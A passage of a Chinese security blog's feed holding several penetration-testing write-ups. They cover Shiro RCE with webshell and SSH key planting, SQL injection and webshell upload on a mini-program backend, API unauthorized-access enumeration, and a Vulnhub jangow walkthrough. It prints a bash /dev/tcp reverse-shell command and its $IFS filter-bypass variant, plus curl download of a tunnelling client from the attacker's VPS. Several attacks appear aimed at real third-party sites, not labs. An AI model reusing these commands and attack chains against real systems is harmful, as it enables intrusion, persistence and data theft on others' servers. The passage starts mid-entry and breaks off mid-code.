class="string">&quot;X-Cmd-Response&quot;</span>,#a))&#125;</span><br></pre></td></tr></table></figure><p>尝试反弹shell：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310145440253.png" alt="image-20230310145440253"></p><p>反弹shell成功</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310145348745.png" alt="image-20230310145348745"></p><h3 id="2-bypass"><a href="#2-bypass" class="headerlink" title="2.$*bypass"></a>2.$*bypass</h3><p>与上边同理</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310145740262.png" alt="image-20230310145740262"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310145804161.png" alt="image-20230310145804161"></p><h3 id="3-IFSbypass"><a href="#3-IFSbypass" class="headerlink" title="3.$IFSbypass"></a>3.$IFSbypass</h3><p>反弹shell命令的空格在bash中可以用$IFS替代</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c bash -i &gt;&amp;/dev/tcp/ip/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>使用$IFS替代空格：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c bash$IFS-i$IFS&gt;&amp;/dev/tcp/ip/8888$IFS0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>尝试进行shell反弹</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310151513558.png" alt="image-20230310151513558"></p><p>成功反弹shell</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310151432322.png" alt="image-20230310151432322"></p><h2 id="5-代理NPS落地"><a href="#5-代理NPS落地" class="headerlink" title="5.代理NPS落地"></a>5.代理NPS落地</h2><p>shell成功反弹，就要考虑进内网扫描一波了，一是上传扫描工具直接扫描，二是将流量代理出来，本地扫描一波</p><p>代理工具很多，各有优缺点，使用NPS进行内网穿透，NPC不需要配置，只需要文件落地即可</p><p>个人VPS有NPC端，目标主机有curl命令</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310152607184.png" alt="image-20230310152607184"></p><p>此时个人VPS开启python服务，目标主机用curl -O命令下载并保存npc端到本地</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310152829399.png" alt="image-20230310152829399"></p><p>开启python服务 +] python3版本： python3 -m http.server 8888</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154306616.png" alt="image-20230310154306616"></p><p>目标主机进行下载：curl -O <a href="http://xxxx:8888/file">http://xxxx:8888/file</a></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154357664.png" alt="image-20230310154357664"></p><p>解压并运行，服务端提前配置好</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154450133.png" alt="image-20230310154450133"></p><p>运行.&#x2F;npc</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154625134.png" alt="image-20230310154625134"></p><h2 id="6-内网"><a href="#6-内网" class="headerlink" title="6.内网"></a>6.内网</h2><p>可以看到客户端已经”上线”</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154728387.png" alt="image-20230310154728387"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154757423.png" alt="image-20230310154757423"></p><p>Proxifier进行socks5代理即可</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310154847367.png" alt="image-20230310154847367"></p><p>配置firefox代理进入内网、k&#x2F;fscan扫起来：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310161228500.png" alt="image-20230310161228500"></p><p>再尝试echo &gt;&gt;追加进去公钥</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310161650860.png" alt="image-20230310161650860"></p><p>X-shell配置好之后</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310161933762.png" alt="image-20230310161933762"></p><p>追加公钥成功</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310162115513.png" alt="image-20230310162115513"></p><p>本地设置好socks5代理</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310162409706.png" alt="image-20230310162409706"></p><p>成功代理登陆：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310162623531.png" alt="image-20230310162623531"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">钟声敲响了日落</span><br><span class="line">柏油路跃过山坡</span><br><span class="line">一直通向北方的 使我们想象</span><br><span class="line">长大后也未曾经过……</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次Shiro命令执行到写入SSH公钥登陆</title>
      <link href="/posts/917134f1/"/>
      <url>/posts/917134f1/</url>
      
        <content type="html"><![CDATA[<h2 id="1-思路"><a href="#1-思路" class="headerlink" title="1.思路"></a>1.思路</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shiro命令执行(root)-内存马注入-getshell-sockes5代理-Xshell生成密钥-远程修改密钥失败-本地添加密钥-SSH公钥登陆</span><br></pre></td></tr></table></figure><h2 id="2-Shiro命令执行"><a href="#2-Shiro命令执行" class="headerlink" title="2.Shiro命令执行"></a>2.Shiro命令执行</h2><p>某国外站点，外围打点得知是Shiro框架，直接工具爆破密钥以及利用链就可-常规操作</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218152329342.png" alt="image-20230218152329342"><br>默认key瞬间出来，利用链也爆破出来了，直接执行命令，root权限</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218152419443.png" alt="image-20230218152419443"></p><h2 id="3-内存马注入-getshell"><a href="#3-内存马注入-getshell" class="headerlink" title="3.内存马注入-getshell"></a>3.内存马注入-getshell</h2><p>随后尝试注入内存马（冰蝎、哥斯拉等随意）</p><p>冰蝎内存马注入成功</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218152843258.png" alt="image-20230218152843258"></p><p>随后冰蝎连接提示页面存在，密钥无法获取，换哥斯拉再试试</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218152949329.png" alt="image-20230218152949329"></p><p>成功getshell</p><h2 id="4-socks5代理"><a href="#4-socks5代理" class="headerlink" title="4.socks5代理"></a>4.socks5代理</h2><p>由于目标主机远程无法直接登陆，只能进行socks5代理，随后尝试写入SSH公钥连接</p><p>由于对方是shiro框架，常见的目录如&#x2F;opt&#x2F;tomcat&#x2F;webapps&#x2F;ROOT不存在，索性挨个翻，尝试了不少目录但是都是302跳转</p><p>再次收集站点框架信息，找静态资源试试</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218153347287.png" alt="image-20230218153347287"></p><p>jquery.js框架属实太通用了，所以继续找静态资源文件中的js目录，终于……</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218153526790.png" alt="image-20230218153526790"></p><p>先上传一个图片试试水，看看能不能访问</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/updog.png" alt="image-20230218153717165"></p><p>随后上传reGeorg内网渗透工具中的jsp脚本，尝试访问</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218153834563.png" alt="image-20230218153834563"></p><p>随后监听：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218153939263.png" alt="image-20230218153939263"></p><h2 id="5-xshell生成用户密钥"><a href="#5-xshell生成用户密钥" class="headerlink" title="5.xshell生成用户密钥"></a>5.xshell生成用户密钥</h2><p>新建用户密钥，按照默认的就行，随后输入密码（随意设置即可，简单点……）</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218154042253.png" alt="image-20230218154042253"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218154116843.png" alt="image-20230218154116843"></p><p>可以将生成的密钥保存到本地，也可以双击已生成的用户密钥查看公钥内容</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218154154782.png" alt="image-20230218154154782"></p><h2 id="6-远程修改公钥文件"><a href="#6-远程修改公钥文件" class="headerlink" title="6.远程修改公钥文件"></a>6.远程修改公钥文件</h2><ol><li>假如authorized_keys文件不存在，尝试创建，之前遇到的网站用户貌似无权限，可能需提取到root才行，不过本系统已是root，无需提权，尝试修改authorized_keys文件<br>结果返回null…..，重新尝试修改，还是null，哥斯拉自带编辑器貌似也修改不成功<br>换一种思路，先下载到本地，将xshell生成的公钥内容复制进去（不是替换内容）<br>然后删除远程.ssh文件夹下的authorized_keys文件，随后上传修改好的authorized_keys到.ssh目录下</li></ol><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218154720902.png" alt="image-20230218154720902"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218154815660.png" alt="image-20230218154815660"><br>注意文件修改时间，毕竟是国外的，有时差，所以是国外是凌晨六点钟？？？</p><h2 id="7-公钥登陆"><a href="#7-公钥登陆" class="headerlink" title="7. 公钥登陆"></a>7. 公钥登陆</h2><p>公钥已经上传，接下来是本地xshell进行socks5代理以及公钥登陆（非password登陆）</p><ol><li>远程登陆不了，只能本地ip<br> <img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218155107023.png" alt="image-20230218155107023"></li><li>选择公钥登陆（非password）</li></ol><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218155227300.png" alt="image-20230218155227300"><br>3. xshell设置socks5代理</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218155401280.png" alt="image-20230218155401280"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218155438976.png" alt="image-20230218155438976"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">设置本地ip-选择公钥登陆-xshell设置socks5代理</span><br></pre></td></tr></table></figure><p>然后点击连接即可</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218155621300.png" alt="image-20230218155621300"><br>输入用户名root，然后进行公钥登陆认证，密码就是刚刚xshell设置给用户密钥加密的密码</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218155707126.png" alt="image-20230218155707126"></p><p>登陆成功<br><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218155812929.png" alt="image-20230218155812929"><br>对比哥斯拉执行的命令以及ssh登陆成功执行的命令<br><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218155901107.png" alt="image-20230218155901107"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/dogsaniao.jpg" alt="QQ图片20230218160935"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次微信小程序渗透测试</title>
      <link href="/posts/6608ce41/"/>
      <url>/posts/6608ce41/</url>
      
        <content type="html"><![CDATA[<h2 id="记一次微信小程序渗透测试"><a href="#记一次微信小程序渗透测试" class="headerlink" title="记一次微信小程序渗透测试"></a>记一次微信小程序渗透测试</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">信息收集-文件上传失败-SQL注入(非DBA)-小程序后台-文件上传失败-文件上传成功-GetShell</span><br></pre></td></tr></table></figure><p>工具环境：Windows10、VX客户端V3.7.5.23、Proxifier、Bp</p><h3 id="1-proxifier-bp抓取微信小程序进程包"><a href="#1-proxifier-bp抓取微信小程序进程包" class="headerlink" title="1.proxifier+bp抓取微信小程序进程包"></a>1.proxifier+bp抓取微信小程序进程包</h3><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20221205234756668.png" alt="image-20221205234756668"></p><h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">域名：https://www.xxx.cn</span><br><span class="line">IP:  101.xx.xxx.8</span><br><span class="line">端口：21、22、3306、888、8888（必须宝塔）443</span><br><span class="line">小程序后台：https://www.xxx.cn/admin/auth/login.html</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>我一般测小程序主要挖密码找回、支付逻辑、短信炸弹、登陆绕过、越权等，随后找注入，上传等能拿到shell的或者其余高危漏洞。</p><h3 id="3-文件上传-失败"><a href="#3-文件上传-失败" class="headerlink" title="3.文件上传(失败)"></a>3.文件上传(失败)</h3><p>随后微信客户端打开小程序，输入手机号验证码登陆</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20221205234730198.png" alt="image-20221205234730198"></p><p>这个小程序逻辑也基本测完了，基于token做权限认证，貌似不存在越权什么的<br>剩下的就是个人中心（小程序中一般称我的）上传头像处进行文件上传，此处应该是做了白名单验证，上传不成功</p><p>又或者上传成功了，但是找不到上传位置(反编译小程序源代码或许会找到点思路，此处未进行此操作)</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20221205235148942.png" alt="image-20221205235148942"></p><p>查看返回包内容：</p><p>应该是上传失败了，图片参数显示未定义</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20221205235259085.png" alt="image-20221205235259085"></p><p>随后就找注入（商品、栏目、购物车、个人信息、搜索框等），有多个未加密的ID参数，尝试报错，时间盲注都无结果</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20221206001038084.png" alt="image-20221206001038084"></p><h3 id="4-SQL注入-非DBA"><a href="#4-SQL注入-非DBA" class="headerlink" title="4.SQL注入(非DBA)"></a>4.SQL注入(非DBA)</h3><p>测完了其它功能就剩一个搜索框了（之前测得不少小程序搜索框只是摆设，并无实际搜索功能，所以最后才测试有无注入什么的）</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20221205235025747.png" alt="image-20221205235025747"></p><p>未曾想到一发入魂，报错注入：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/baocuo.png"></p><p>熟悉TP的师傅们一眼也能看出来，不是TP就是基于TP二开的，试了试老洞也没有结果</p><p>sqlmap看看是不是DBA</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/sqlmap.png"></p><h3 id="5-小程序后台"><a href="#5-小程序后台" class="headerlink" title="5.小程序后台"></a>5.小程序后台</h3><p>很遗憾并不是，但是此时我们已经收集到了小程序的后台：<a href="https://www.xxx.cn/admin/auth/login.html">https://www.xxx.cn/admin/auth/login.html</a></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20221205235654671.png" alt="image-20221205235654671"></p><p>弱口令无果，那就sqlmap跑出来管理员账号密码</p><p>直接跑出管理员账号密码看看登陆进去能不能拿到shell</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/sqlmap%E8%B7%91%E5%87%BA%E5%AF%86%E7%A0%81.png"></p><p>管理员用户有好几个，密码貌似没见过这种加密方式、强用户名，猜测极有可能是弱密码了，123456做密码，进入后台。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/houtai.png"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/dog.jpg"></p><h3 id="6-文件上传-失败"><a href="#6-文件上传-失败" class="headerlink" title="6.文件上传(失败)"></a>6.文件上传(失败)</h3><p>进入后台首要找上传点，个人信息处头像上传，课程编辑图片上传、都上传不了马儿</p><p>各种提示文件不支持，要么就是不解析什么的</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20221206000044981.png" alt="image-20221206000044981"></p><p>唉~</p><p> <img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/xiongda.png"></p><p>随后随便点开各个功能模块，测试有无别的洞，点击其中一个模块提示无权限。</p><p>意思就是这只是其中一个管理员账号，还有别的不同权限的管理员账号</p><p>随后换账号，弱密码123456继续登陆进来</p><h3 id="7-文件上传-成功"><a href="#7-文件上传-成功" class="headerlink" title="7.文件上传(成功)"></a>7.文件上传(成功)</h3><p>是一个业务专员的账号，页面功能模块不一样了，感觉有戏</p><p>继续找上传。。。终于，ueditor编辑器，然后看到页面URL，tp的伪静态，估计也有注入，还是找上传吧</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/ueditor.png"></p><p>测试之后，前端绕过即可，PHP上传成功</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/upcg.png"></p><h3 id="8-GetShell"><a href="#8-GetShell" class="headerlink" title="8.GetShell"></a>8.GetShell</h3><p>蚁剑连接，成功getshell</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/yijianlianjie.png"></p><p>总结：前台小程序个人头像上传处上传图片失败（大概率）还是成功，可能需要裤子脱下来才能知道，算了吧</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/SYHD459719813012.gif"></p><p>你裤子都没脱，你凭什么？</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0day漏洞挖掘案例</title>
      <link href="/posts/a83ff7dd/"/>
      <url>/posts/a83ff7dd/</url>
      
        <content type="html"><![CDATA[<h2 id="一-思路"><a href="#一-思路" class="headerlink" title="一.思路"></a>一.思路</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">绕过登陆（无效）-发现接口-JS审计-爆破接口-未授权访问-SQL注入</span><br></pre></td></tr></table></figure><h2 id="二-打点收集"><a href="#二-打点收集" class="headerlink" title="二.打点收集"></a>二.打点收集</h2><h3 id="1-失败的绕过登陆"><a href="#1-失败的绕过登陆" class="headerlink" title="1.失败的绕过登陆"></a>1.失败的绕过登陆</h3><p>在进行信息收集的时候，发现该系统登陆失败与成功返回的状态码，登陆成功为1000、登陆失败为1100<br><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/202210281.png"></p><p>在登陆的时候进行抓包，修改返回包的状态码为1000，此时提示登陆成功，页面跳转到后台管理首页，但是页面是空白</p><p>后边才发现直接吧login.html改成index.html也可以进入空白后台。。所以是失败的绕过登陆</p><p>刷新网页，F12看请求，查看有无接口存在：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/202210282.png"></p><p>尝试访问该接口，得到返回成功的一条信息</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/202210283.png"></p><p>该接口返回的是后台系统的名称等信息，无其它敏感信息，但是接口的url展示出来的路径与进入后台的路径并不一样</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">未授权的后台路径：http://xxxxx.com/a-b-c/xxxx/xxx/index.html</span><br><span class="line">未授权的接口路径：http://xxxxx.com/c-d-e/xxxxx/xxxxxx/xxxxxx</span><br></pre></td></tr></table></figure><p>先将路径记下来，待会可能会用到，信息收集就是要面面俱到</p><h3 id="2-JS审计"><a href="#2-JS审计" class="headerlink" title="2.JS审计"></a>2.JS审计</h3><p>后台查看网站源代码，直接进行JS审计</p><ul><li>第一个接口暴漏：就是刚刚进入后台刷新界面得到的接口路径，注意上边提到了与未授权的后台初始路径不一样，这就是说源代码中暴漏的所有接口都可以尝试使用接口暴漏的路径进行拼接访问。</li></ul><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/202210284.png"></p><ul><li>第二个接口暴漏：接口使用get传递，后边拼接某个参数id值</li></ul><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/202210285.png"></p><p>使用刚刚的路径进行拼接访问：拼接的某个参数id值我赋值为0测试</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/202210286.png"></p><p>但是提示404，说明这个id获取不到任何数据，一种情况是0不存在，对0设置变量进行爆破，第二种情况是0参数后边可能还需要跟参数（后边也验证了这个想法，确实需要跟参数才能正确获取接口数据）</p><ul><li>第三个接口暴漏：提示接口url后边加当前用户名，继续拼接url测试访问</li></ul><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/202210287.png"></p><p>假设当前用户名是admin，那么在暴漏的接口后边加&#x2F;admin访问，提示请求成功，但是并未返回任何有用的信息，这个时候猜测可能admin不存在，没有返回任何信息而已，直接对当前用户进行爆破</p><p>成功爆破出test用户并返回部分信息，但是并无特别敏感信息，继续找接口</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/202210289.png"></p><ul><li>第四个接口暴漏：看接口的名称像是获取系统管理设置的接口</li></ul><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102810.png"></p><p>直接访问该接口获取到了四五个路径以及一个类似管理员的账号twadmin</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102812.png"></p><h2 id="三-未授权访问x1"><a href="#三-未授权访问x1" class="headerlink" title="三.未授权访问x1"></a>三.未授权访问x1</h2><h3 id="3-柳暗花明"><a href="#3-柳暗花明" class="headerlink" title="3.柳暗花明"></a>3.柳暗花明</h3><p>刚刚爆破出一个test用户，直接把twadmin替换test获取管理员信息-返回管理员登陆系统的时间</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102811.png"></p><p>这个时候可以针对管理员密码进行爆破，既然有那么多接口，不如继续挖未授权访问，其实是因为CNVD不收web通用型弱口令（吼吼吼吼吼吼吼吼）。。。。。</p><p>刚刚还有几个html页面没有访问，直接访问看看能不能发现别的接口，访问页面报错，很正常，空壳子，又没登陆，直接查看源代码找接口吧</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102813.png"></p><ul><li>第五个接口暴漏</li></ul><p>第五个接口的url和第二个接口的url一模一样，只是后边加了一个ssxtbm参数，验证了刚刚后边加参数才能正确获取接口信息的猜想</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102814.png"></p><p>dlyhid后边不加ssxtbm参数提示404</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102815.png"></p><p>Dlyhid后边加ssxtbm参数提示请求成功，只是没有返回任何数据</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102816.png"></p><p>说明dlyhid参数是存在的，而ssxtbm参数是不存在的，所以没有返回任何信息，对ssxtbm参数进行爆破！！！</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102817.png"></p><p>发现该接口是获取后台管理系统菜单信息的接口，获取到的都是菜单信息，也不算特别敏感内容</p><p>此时获取菜单接口的url是：<a href="http://xxxxx/asas/saasas/asas/0/50000">http://xxxxx/asas/saasas/asas/0/50000</a></p><p>把0改成1试一下，同时改变后边的参数</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102818.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxx/asas/saasas/asas/1/50000</span><br><span class="line"></span><br><span class="line">http://xxxxx/asas/saasas/asas/1/30000</span><br></pre></td></tr></table></figure><p>成功返回资源地址</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102819.png"></p><p>尝试对资源地址进行访问，直接未授权访问，可以进行删除、查询、添加等操作</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102820.png"></p><p>尝试访问别的资源</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102821.png"></p><p>接口这么多……扎布夺得了</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102822.png"></p><h3 id="4-批量验证"><a href="#4-批量验证" class="headerlink" title="4.批量验证"></a>4.批量验证</h3><p>直接POST请求以及GET请求未授权接口获取信息即可</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102823.png"></p><p>吼吼吼 <img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/dog.jpg"></p><h3 id="5-end"><a href="#5-end" class="headerlink" title="5.end"></a>5.end</h3><p>到这里你以为结束了？？？</p><p>怎么可能！！！</p><p>未授权到手了，证书有了，但是一个不行啊，太少了，都未授权了，为什么不试试别的？？？</p><p>不多搞一下对不起熬那么晚的夜啊</p><h2 id="四-SQL注入x1"><a href="#四-SQL注入x1" class="headerlink" title="四.SQL注入x1"></a>四.SQL注入x1</h2><h3 id="6-出货-2"><a href="#6-出货-2" class="headerlink" title="6.出货*2"></a>6.出货*2</h3><p>刚刚测试未授权接口的时候，有个查询功能？？query？</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/20221028824.png"></p><p>直接get访问提示get请求不允许，那就post：</p><p>content-type又不对</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/cp.png"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/zd.jpg"></p><p>众多接口得知，需要改content-type为json格式</p><p>配合接口请求的数据</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102825.png"></p><p>直接用bp发送：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102826.png"></p><p>请求成功！！！</p><p>修改null为1’，继续发送，测试是否存在SQL注入</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102827.png"></p><p>意思是让我们字符型加引号就好了</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture%2F2022102828.png"></p><p>SQL注入一枚，证书*2</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub之jangow打靶思路</title>
      <link href="/posts/6da7162c/"/>
      <url>/posts/6da7162c/</url>
      
        <content type="html"><![CDATA[<h1 id="一-Vulnhub之jangow打靶思路"><a href="#一-Vulnhub之jangow打靶思路" class="headerlink" title="一. Vulnhub之jangow打靶思路"></a>一. Vulnhub之jangow打靶思路</h1><h2 id="1-打靶思路总结"><a href="#1-打靶思路总结" class="headerlink" title="1.  打靶思路总结"></a>1.  打靶思路总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">信息收集-命令执行-getshell-FTP登陆-不出网反弹shell-ptyshell-SSH登陆-dirtycow提权，最终拿到root权限，获取Flag。</span><br><span class="line">* 攻击机：Kali，本机</span><br><span class="line">* 目标靶机：jangow</span><br></pre></td></tr></table></figure><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><p>靶机IP：192.168.56.118，Nmap进行端口扫描，靶机开放80以及21FTP端口，尝试FTP弱口令是否能登陆，经测试，anoymous&#x2F;anoymous弱口令不存在。<br><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906090413848.png" alt="image-20220906090413848"><br>随后访问80端口，web站点出现，PHP站点+Apache中间件。<br><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906090652344.png" alt="image-20220906090652344"><br>尝试进行目录扫描：只发现了静态资源文件夹</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906090900177.png" alt="image-20220906090900177"></p><p>尝试访问其它界面：<a href="http://192.168.56.118/site/busque.php?buscar=">http://192.168.56.118/site/busque.php?buscar=</a></p><p>bp进行不断Fuzz，命令执行漏洞X1</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906091733028.png" alt="image-20220906091733028"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906091758275.png" alt="image-20220906091758275"></p><h2 id="3-一句话木马Getshell"><a href="#3-一句话木马Getshell" class="headerlink" title="3.一句话木马Getshell"></a>3.一句话木马Getshell</h2><p>既然存在命令执行，尝试使用PHP反弹shell试试，PHP反弹shell失败，怀疑不出网</p><p>查看系统有无python，使用python反弹shell，nc没反应，大概率就是不出网</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906093246928.png" alt="image-20220906093246928"></p><p>随后转变思路，尝试echo一句话进去，哥斯拉生成php马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;?php 